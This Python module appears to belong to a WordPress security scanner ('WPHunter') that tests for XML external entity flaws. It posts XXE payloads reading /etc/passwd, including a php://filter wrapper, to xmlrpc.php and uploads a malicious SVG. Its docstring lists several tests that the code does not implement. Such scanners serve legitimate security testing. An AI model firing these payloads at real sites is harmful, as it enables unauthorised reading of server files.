"""
WPHunter - XXE (XML External Entity) Scanner
============================================
Test for XXE vulnerabilities in WordPress XML processing.

Tests:
1. XML-RPC XXE
2. SOAP endpoint XXE
3. SVG XXE
4. File upload XXE
5. Out-of-band XXE (OOB)
6. Blind XXE detection

CWE-611: Improper Restriction of XML External Entity Reference
"""

import asyncio
from dataclasses import dataclass
from typing import Dict, List, Optional

from core.http_client import WPHttpClient
from core.logger import logger
from core.security import get_rate_limiter


@dataclass
class XXEFinding:
    """XXE vulnerability finding."""
    endpoint: str
    xxe_type: str
    evidence: str
    severity: str = "critical"
    cwe: str = "CWE-611"
    payload: Optional[str] = None
    
    def to_dict(self) -> Dict:
        return {
            "type": "XXE",
            "endpoint": self.endpoint,
            "xxe_type": self.xxe_type,
            "evidence": self.evidence[:300],
            "severity": self.severity
        }


class XXEScanner:
    """XXE vulnerability scanner for WordPress."""
    
    def __init__(self, http_client: WPHttpClient):
        self.http = http_client
        self.findings: List[XXEFinding] = []
        self.rate_limiter = get_rate_limiter()
    
    async def scan(self) -> List[XXEFinding]:
        """Run XXE tests."""
        logger.section("XXE Vulnerability Scan")
        
        # 1. XML-RPC XXE
        await self._test_xmlrpc_xxe()
        
        # 2. SVG XXE
        await self._test_svg_xxe()
        
        logger.success(f"XXE scan: {len(self.findings)} findings")
        return self.findings
    
    async def _test_xmlrpc_xxe(self):
        """Test XML-RPC for XXE."""
        logger.info("Testing XML-RPC XXE...")
        
        xxe_payloads = [
            # Classic XXE
            '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<methodCall>
    <methodName>system.listMethods</methodName>
    <params><param><value>&xxe;</value></param></params>
</methodCall>''',
            
            # PHP wrapper
            '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<methodCall>
    <methodName>system.listMethods</methodName>
    <params><param><value>&xxe;</value></param></params>
</methodCall>''',
        ]
        
        for payload in xxe_payloads:
            await self.rate_limiter.acquire()
            
            try:
                response = await self.http.post(
                    "/xmlrpc.php",
                    data=payload,
                    headers={"Content-Type": "text/xml"}
                )
                
                # Check for XXE indicators
                if response.ok:
                    indicators = ["root:", "bin/bash", "/etc/passwd", "daemon:"]
                    
                    if any(ind in response.text for ind in indicators):
                        self.findings.append(XXEFinding(
                            endpoint="/xmlrpc.php",
                            xxe_type="classic_xxe",
                            evidence="XXE vulnerability in XML-RPC",
                            severity="critical",
                            payload=payload[:200]
                        ))
                        logger.vuln("critical", "XML-RPC XXE vulnerability")
                        break
                        
            except Exception:
                continue
    
    async def _test_svg_xxe(self):
        """Test SVG upload for XXE."""
        logger.info("Testing SVG XXE...")
        
        svg_xxe = b'''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
    <text font-size="16" x="0" y="16">&xxe;</text>
</svg>'''
        
        try:
            files = {'file': ('xxe.svg', svg_xxe, 'image/svg+xml')}
            response = await self.http.post('/wp-admin/async-upload.php', files=files)
            
            if response.ok:
                # Try to access uploaded SVG
                uploaded_url = self._extract_url(response.text)
                
                if uploaded_url:
                    verify = await self.http.get(uploaded_url)
                    
                    if verify.ok and "root:" in verify.text:
                        self.findings.append(XXEFinding(
                            endpoint="/wp-admin/async-upload.php",
                            xxe_type="svg_xxe",
                            evidence=f"SVG XXE vulnerability: {uploaded_url}",
                            severity="critical"
                        ))
                        logger.vuln("critical", "SVG XXE vulnerability")
                        
        except Exception:
            pass
    
    def _extract_url(self, text: str) -> Optional[str]:
        """Extract URL from response."""
        import re
        match = re.search(r'https?://[^\s<>"]+\.svg', text)
        return match.group(0) if match else None
    
    def get_summary(self) -> Dict:
        """Get summary."""
        return {
            "total": len(self.findings),
            "by_type": {
                "xmlrpc": len([f for f in self.findings if "xmlrpc" in f.xxe_type]),
                "svg": len([f for f in self.findings if "svg" in f.xxe_type]),
            },
            "findings": [f.to_dict() for f in self.findings]
        }
